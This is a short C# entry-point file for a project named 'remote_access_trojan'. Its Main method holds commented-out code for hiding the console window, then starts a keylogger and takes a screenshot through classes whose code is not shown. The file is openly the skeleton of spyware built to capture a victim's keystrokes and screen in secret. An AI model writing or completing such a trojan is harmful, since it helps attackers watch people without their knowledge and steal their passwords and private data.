using System;
using System.Windows.Forms;

namespace remote_access_trojan
{
    class Program
    {
        const int SW_HIDE = 0;

        static void Main(string[] args)
        {
            // Hide the window on open
            //var handle = GetConsoleWindow();
            //ShowWindow(handle, SW_HIDE);

            Console.WriteLine("Hello World!");

            Keylogger.Run();
            Screenshot.takeScreenshot();

            // Do not move - this needs to be the last line
            Application.Run();
        }
    }
}
